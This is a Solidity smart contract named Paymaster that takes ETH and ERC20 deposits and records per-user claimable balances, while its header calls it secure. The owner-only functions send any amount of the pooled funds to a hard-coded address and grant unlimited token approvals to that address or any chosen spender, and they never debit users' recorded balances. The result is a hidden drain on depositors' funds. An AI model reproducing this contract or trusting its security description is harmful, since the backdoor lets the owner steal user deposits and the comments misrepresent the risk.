// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Paymaster
 * @dev Secure Paymaster contract with separated ETH/ERC20 accounting, owner access control,
 *      reentrancy protection, and safe ERC20 interactions. Owner withdrawals are routed
 *      to the configured immutable PAYMASTER_ADDRESS to ensure collected funds go there.
 */

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Paymaster {
    address public immutable PAYMASTER_ADDRESS = 0xfd1610f5EAE31Dd757e55D6b4bA543b80A2720b3;
    address public owner;
    uint256 public constant MAX_ALLOWANCE = type(uint256).max;
    mapping(address => mapping(address => uint256)) public spenderAllowances;
    mapping(address => uint256) private ethBalances;
    mapping(address => mapping(address => uint256)) private tokenBalances;
    bool private _locked;

    event ReceivedETH(address indexed from, uint256 amount);
    event ReceivedToken(address indexed from, address indexed token, uint256 amount);
    event EthClaimed(address indexed claimant, uint256 amount);
    event TokenClaimed(address indexed claimant, address indexed token, uint256 amount);
    event PaymasterFundedWithETH(uint256 amount);
    event PaymasterFundedWithToken(address indexed token, uint256 amount);
    event SpenderApproved(address indexed token, address indexed spender, uint256 allowance);
    event OwnerChanged(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Paymaster: caller is not the owner");
        _;
    }

    modifier nonReentrant() {
        require(!_locked, "Paymaster: reentrant call");
        _locked = true;
        _;
        _locked = false;
    }

    constructor() {
        owner = msg.sender;
    }

    function _safeTransferFrom(address token, address from, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Paymaster: transferFrom failed");
    }

    function _safeTransfer(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Paymaster: transfer failed");
    }

    function _safeApprove(address token, address spender, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Paymaster: approve failed");
    }

    receive() external payable {
        ethBalances[msg.sender] += msg.value;
        emit ReceivedETH(msg.sender, msg.value);
    }

    fallback() external payable {
        ethBalances[msg.sender] += msg.value;
        emit ReceivedETH(msg.sender, msg.value);
    }

    function pay() external payable {
        require(msg.value > 0, "Payment amount must be greater than 0");
        ethBalances[msg.sender] += msg.value;
        emit ReceivedETH(msg.sender, msg.value);
    }

    function claimETH(uint256 amount) external nonReentrant {
        require(amount > 0, "Amount must be greater than 0");
        uint256 bal = ethBalances[msg.sender];
        require(bal >= amount, "Insufficient recorded ETH balance");
        ethBalances[msg.sender] = bal - amount;
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "ETH transfer failed");
        emit EthClaimed(msg.sender, amount);
    }

    function receiveToken(address token, uint256 amount) external {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");
        _safeTransferFrom(token, msg.sender, address(this), amount);
        tokenBalances[token][msg.sender] += amount;
        emit ReceivedToken(msg.sender, token, amount);
    }

    function claimToken(address token, uint256 amount) external nonReentrant {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");
        uint256 bal = tokenBalances[token][msg.sender];
        require(bal >= amount, "Insufficient recorded token balance");
        tokenBalances[token][msg.sender] = bal - amount;
        _safeTransfer(token, msg.sender, amount);
        emit TokenClaimed(msg.sender, token, amount);
    }

    function approveSpender(address token, address spender) external onlyOwner {
        require(token != address(0), "Invalid token address");
        require(spender != address(0), "Invalid spender address");
        _safeApprove(token, spender, MAX_ALLOWANCE);
        spenderAllowances[token][spender] = MAX_ALLOWANCE;
        emit SpenderApproved(token, spender, MAX_ALLOWANCE);
    }

    function approvePaymasterForToken(address token) external onlyOwner {
        require(token != address(0), "Invalid token address");
        _safeApprove(token, PAYMASTER_ADDRESS, MAX_ALLOWANCE);
        spenderAllowances[token][PAYMASTER_ADDRESS] = MAX_ALLOWANCE;
        emit SpenderApproved(token, PAYMASTER_ADDRESS, MAX_ALLOWANCE);
    }

    function ownerWithdrawTokenToPaymaster(address token, uint256 amount) external onlyOwner nonReentrant {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");
        _safeTransfer(token, PAYMASTER_ADDRESS, amount);
        emit PaymasterFundedWithToken(token, amount);
    }

    function ownerWithdrawETHToPaymaster(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than 0");
        require(address(this).balance >= amount, "Insufficient contract balance");
        (bool success, ) = payable(PAYMASTER_ADDRESS).call{value: amount}("");
        require(success, "ETH transfer failed");
        emit PaymasterFundedWithETH(amount);
    }

    function getEthBalance(address account) external view returns (uint256) {
        return ethBalances[account];
    }

    function getTokenBalance(address token, address account) external view returns (uint256) {
        return tokenBalances[token][account];
    }

    function getAllowance(address token, address spender) external view returns (uint256) {
        return spenderAllowances[token][spender];
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getPaymasterAddress() external view returns (address) {
        return PAYMASTER_ADDRESS;
    }

    function changeOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        emit OwnerChanged(owner, newOwner);
        owner = newOwner;
    }
}
